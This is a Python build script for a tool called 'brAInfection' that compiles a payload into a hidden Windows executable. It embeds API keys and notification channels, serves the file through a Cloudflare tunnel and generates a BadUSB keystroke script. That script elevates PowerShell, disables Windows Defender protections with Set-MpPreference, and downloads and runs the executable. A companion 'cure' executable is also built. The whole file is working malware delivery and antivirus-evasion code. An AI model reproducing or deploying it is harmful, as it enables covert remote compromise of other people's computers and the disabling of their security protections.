import argparse
import http.server
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
PAYLOAD = os.path.join(HERE, "payload.py")
CURE_PAYLOAD = os.path.join(HERE, "cure_payload.py")
SENTINEL = "__BRANFECTION_CONFIG__"
CURE_NAME = "brAInfection-cura"


def ensure_pyinstaller():
    if importlib.util.find_spec("PyInstaller") is not None:
        return
    print("[build] instalando pyinstaller")
    try:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "--disable-pip-version-check", "pyinstaller"],
            check=True,
        )
        return
    except subprocess.CalledProcessError:
        pass
    target = os.path.join(HERE, ".build-tools")
    os.makedirs(target, exist_ok=True)
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "--disable-pip-version-check",
         "--target", target, "pyinstaller"],
        check=True,
    )
    sys.path.insert(0, target)
    os.environ["PYTHONPATH"] = target + os.pathsep + os.environ.get("PYTHONPATH", "")


def documents_dir():
    docs = os.path.join(os.path.expanduser("~"), "Documents")
    os.makedirs(docs, exist_ok=True)
    return docs


def fuse(src, config):
    return src.replace(SENTINEL, repr(config))


def build_exe(src, name, out_dir, console):
    tmp = tempfile.mkdtemp(prefix="branfection-build-")
    payload_path = os.path.join(tmp, "payload.py")
    with open(payload_path, "w", encoding="utf-8") as f:
        f.write(src)
    build_dir = os.path.join(tmp, "build")
    os.makedirs(out_dir, exist_ok=True)
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconfirm", "--clean",
        "--name", name,
        "--distpath", out_dir,
        "--workpath", build_dir,
        "--specpath", tmp,
    ]
    if not console:
        cmd.append("--noconsole")
    cmd.append(payload_path)
    subprocess.run(cmd, check=True)
    return os.path.join(out_dir, name + (".exe" if os.name == "nt" else ""))


def badusb_script(exe_url):
    disable = (
        "Set-MpPreference -DisableRealtimeMonitoring 1 -EA 0;"
        "Set-MpPreference -DisableBehaviorMonitoring 1 -EA 0;"
        "Set-MpPreference -DisableBlockAtFirstSeen 1 -EA 0;"
        "Set-MpPreference -DisableIOAVProtection 1 -EA 0;"
        "Set-MpPreference -DisableScriptScanning 1 -EA 0"
    )
    download = "iwr %s -o $env:TEMP\\b.exe -UseBasicParsing;saps $env:TEMP\\b.exe;exit" % exe_url
    return """REM Title:         brAInfection BadUSB
REM Description:   2 fases: eleva PowerShell, desliga realtime, baixa e roda o exe; fecha o console no fim
REM Layout:        configurar o Bruce igual ao teclado do alvo
REM Attackmodes:   HID
DELAY 1500
GUI r
DELAY 800
STRING powershell Start-Process powershell -Verb RunAs
DELAY 300
ENTER
DELAY 2500
LEFT
DELAY 200
ENTER
DELAY 2500
ALT TAB
DELAY 500
STRING %s
DELAY 300
ENTER
DELAY 1500
STRING %s
DELAY 300
ENTER
""" % (disable, download)


def find_cloudflared():
    p = shutil.which("cloudflared")
    if p:
        return p
    dest = os.path.join(tempfile.gettempdir(), "cloudflared-build.exe")
    if os.path.isfile(dest):
        return dest
    url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "brAInfection"})
        with urllib.request.urlopen(req, timeout=60) as r, open(dest, "wb") as out:
            shutil.copyfileobj(r, out, length=1024 * 1024)
        return dest
    except Exception:
        return None


class _Handler(http.server.SimpleHTTPRequestHandler):
    extensions_map = {
        **http.server.SimpleHTTPRequestHandler.extensions_map,
        ".ps1": "text/plain; charset=utf-8",
        ".exe": "application/octet-stream",
    }

    def log_message(self, *args):
        pass


def start_file_server(directory, port):
    handler = lambda *a, **k: _Handler(*a, directory=directory, **k)
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", port), handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def start_tunnel(port):
    cf = find_cloudflared()
    if not cf:
        return None, None
    log_path = os.path.join(tempfile.gettempdir(), "cf-build.log")
    with open(log_path, "wb") as lf:
        proc = subprocess.Popen(
            [cf, "tunnel", "--url", "http://127.0.0.1:%d" % port, "--no-autoupdate"],
            stdout=lf, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
        )
    end = time.time() + 60
    url = None
    while time.time() < end:
        try:
            with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
                text = f.read()
        except OSError:
            text = ""
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", text)
        if m:
            url = m.group(0)
            break
        time.sleep(1)
    return proc, url


def parse_args():
    p = argparse.ArgumentParser(
        prog="build.py",
        description="Gera o executavel principal, o de cura (em Documentos) e o BadUSB.",
    )
    p.add_argument("--deepseek-api-key", required=True, help="DEEPSEEK_API_KEY")
    p.add_argument("--email", default=None, help="email de destino da URL (necessario so para envio SMTP)")
    p.add_argument("--port", type=int, default=13080, help="porta do dsh web (default 13080)")
    p.add_argument("--cloudflared-token", default=None,
                   help="token de named tunnel (opcional; default usa quick tunnel sem API key)")
    p.add_argument("--hostname", default=None,
                   help="hostname do named tunnel (ex: app.exemplo.com); necessario com --cloudflared-token")
    p.add_argument("--smtp-host", default="smtp.gmail.com")
    p.add_argument("--smtp-port", type=int, default=587)
    p.add_argument("--smtp-user", default=None, help="default: mesmo valor de --email")
    p.add_argument("--smtp-password", default=None,
                   help="senha/app-password SMTP; sem ela a URL so e salva em arquivo")
    p.add_argument("--smtp-no-starttls", action="store_true")
    p.add_argument("--discord-webhook", default=None,
                   help="URL de webhook do Discord para receber a URL (ex: https://discord.com/api/webhooks/...)")
    p.add_argument("--rule-name", default="brAInfection", help="nome das regras de firewall (usado pelo cura para limpar)")
    p.add_argument("--payload-url", default=None,
                   help="(manual/fallback) URL do exe principal; default: servido automaticamente via cloudflared")
    p.add_argument("--serve-port", type=int, default=0,
                   help="porta local do servidor de arquivos (default 0 = automatica)")
    p.add_argument("--dsh-version", default=None, help="pin de versao do @deepseek-ai/dsh")
    p.add_argument("--node-version", default=None, help="pin de versao do node (ex: v20.11.0)")
    p.add_argument("--name", default="brAInfection", help="nome do executavel principal")
    p.add_argument("--output-dir", default=os.path.join(HERE, "dist"))
    p.add_argument("--console", action="store_true", help="exes com janela de console")
    return p.parse_args()


def build_config(a):
    return {
        "deepseek_api_key": a.deepseek_api_key,
        "email": a.email,
        "port": a.port,
        "cloudflared_token": a.cloudflared_token,
        "hostname": a.hostname,
        "smtp_host": a.smtp_host,
        "smtp_port": a.smtp_port,
        "smtp_user": a.smtp_user,
        "smtp_password": a.smtp_password,
        "smtp_starttls": not a.smtp_no_starttls,
        "discord_webhook": a.discord_webhook,
        "rule_name": a.rule_name,
        "dsh_version": a.dsh_version,
        "node_version": a.node_version,
    }


def main():
    a = parse_args()
    config = build_config(a)
    ensure_pyinstaller()

    with open(PAYLOAD, "r", encoding="utf-8") as f:
        main_src = f.read()
    if SENTINEL not in main_src:
        print("[build] sentinela nao encontrada em payload.py")
        sys.exit(1)

    # 1. executavel principal
    main_exe = build_exe(fuse(main_src, config), a.name, a.output_dir, a.console)
    print("[build] principal: %s" % main_exe)

    # 2. executavel de cura -> Documentos
    with open(CURE_PAYLOAD, "r", encoding="utf-8") as f:
        cure_src = f.read()
    if SENTINEL not in cure_src:
        print("[build] sentinela nao encontrada em cure_payload.py")
        sys.exit(1)
    cure_tmp = tempfile.mkdtemp(prefix="branfection-cure-")
    cure_exe = build_exe(fuse(cure_src, config), CURE_NAME, cure_tmp, a.console)
    cure_docs = os.path.join(documents_dir(), CURE_NAME + ".exe")
    try:
        shutil.copy2(cure_exe, cure_docs)
        print("[build] cura: %s" % cure_docs)
    except OSError as e:
        fallback = os.path.join(a.output_dir, CURE_NAME + (".exe" if os.name == "nt" else ""))
        os.makedirs(a.output_dir, exist_ok=True)
        shutil.copy2(cure_exe, fallback)
        print("[build] cura: %s (Documentos negado: %s; salvo no dist)" % (fallback, e))

    # 3. BadUSB: serve o exe via cloudflared (ou url manual)
    badusb_dir = os.path.join(a.output_dir, "badusb")
    os.makedirs(badusb_dir, exist_ok=True)
    serve_dir = tempfile.mkdtemp(prefix="branfection-serve-")
    exe_name = os.path.basename(main_exe)
    shutil.copy2(main_exe, os.path.join(serve_dir, exe_name))

    cf_proc = None
    srv = None
    if a.payload_url:
        exe_url = a.payload_url
    else:
        srv = start_file_server(serve_dir, a.serve_port)
        cf_proc, tunnel_url = start_tunnel(srv.server_address[1])
        if not tunnel_url:
            print("[build] cloudflared falhou ao criar tunnel; use --payload-url para modo manual")
            sys.exit(1)
        exe_url = tunnel_url + "/" + exe_name
        print("[build] tunnel:  %s" % tunnel_url)
        print("[build] exe:     %s" % exe_url)

    with open(os.path.join(badusb_dir, "payload.txt"), "w", encoding="utf-8") as f:
        f.write(badusb_script(exe_url))
    print("[build] badusb: %s" % os.path.join(badusb_dir, "payload.txt"))

    if cf_proc is not None:
        print("[build] servidor ativo; deixe aberto enquanto implanta (Ctrl+C para parar)")
        try:
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            pass
        finally:
            cf_proc.terminate()
            if srv:
                srv.shutdown()

    if not a.discord_webhook and not (a.smtp_password and a.email):
        print("[build] aviso: sem canal de notificacao, a URL sera salva em %%LOCALAPPDATA%%\\brAInfection\\url.txt")


if __name__ == "__main__":
    main()
